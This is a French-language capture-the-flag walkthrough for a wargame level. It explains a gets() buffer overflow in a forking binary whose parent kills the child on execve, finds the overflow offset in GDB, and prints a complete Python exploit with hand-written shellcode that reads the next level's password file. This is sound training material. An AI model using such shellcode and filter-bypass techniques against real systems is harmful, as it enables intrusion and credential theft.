# Walkthrough — level04

## 1. Analyse du binaire

Le programme fork un processus fils et un pere.

**Le fils** :
- Se declare traceable avec `ptrace(PTRACE_TRACEME)`
- Affiche `"Give me some shellcode, k"`
- Lit l'entree utilisateur avec `gets(buffer)` — buffer de **128 octets**, sans verification de taille : **buffer overflow**

**Le pere** :
- Surveille le fils via `ptrace`
- Attend (`wait`) que le fils change d'etat
- Si le fils tente un `execve` (syscall n11) : il le tue avec `kill(child, 9)`

La protection bloque tout shellcode classique qui ouvre un shell via `execve("/bin/sh")`.

---

## 2. Trouver le padding

On cherche combien d'octets il faut ecrire avant d'ecraser le **return address** de `main()`.

Dans GDB, il faut suivre le fils (sinon GDB suit le pere bloque dans `wait()`).

```bash
gdb ./level04
set follow-fork-mode child
run 
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1970]
0x41326641 in ?? ()

0x41326641 == 156 octets

**Padding = 156 octets.**

---

## 3. Trouver l'adresse du buffer

```bash
gdb ./level04
set follow-fork-mode child
break gets
run
x/x $esp+4
# 0xffffd680
```

**Adresse du buffer = `0xffffd680`**

L'adresse obtenue sous GDB est plus basse qu'en execution reelle : GDB injecte des variables d'environnement qui decalent la stack. On vise `0xffffd6a0` (+0x20) en pratique.

---

## 4. Contourner la protection : shellcode sans execve

Puisque `execve` est bloque par le pere via ptrace, on ecrit un shellcode qui :
1. Ouvre `/home/users/level05/.pass` (`open` = syscall 5)
2. Lit son contenu (`read` = syscall 3)
3. L'ecrit sur stdout (`write` = syscall 4)
4. Quitte proprement (`exit` = syscall 1)

Aucun de ces syscalls n'est le n11 : le pere ne tue pas le fils.

---

## 5. Construction du payload

```
[ shellcode (83 octets) ][ padding pour atteindre 156 octets ][ return address ]
```

- **Shellcode** : open/read/write sans execve
- **Padding** : complete jusqu'a 156 octets
- **Return address** : pointe vers le debut du shellcode (`0xffffd6a0`)

---

## 6. Exploit

Le script doit etre ecrit dans un fichier puis execute.
Ne pas coller du Python directement dans le terminal shell.

```bash
cat > /tmp/exploit.py << 'EOF'
import sys

nop = "\x90" * 40

shellcode = nop + (
    "\xeb\x32\x5b"
    "\x31\xc0\xb0\x05\x31\xc9\x31\xd2\xcd\x80"
    "\x89\xc3\x83\xec\x40\x89\xe1"
    "\x31\xc0\xb0\x03\x31\xd2\xb2\x40\xcd\x80"
    "\x89\xc2\x89\xe1"
    "\x31\xc0\xb0\x04\x31\xdb\xb3\x01\xcd\x80"
    "\x31\xc0\xb0\x01\x31\xdb\xcd\x80"
    "\xe8\xc9\xff\xff\xff"
    "/home/users/level05/.pass\x00"
)

padding = "A" * (156 - len(shellcode))
ret = "\xa0\xd6\xff\xff" 

sys.stdout.write(shellcode + padding + ret)
EOF
python /tmp/exploit.py | ./level04
```
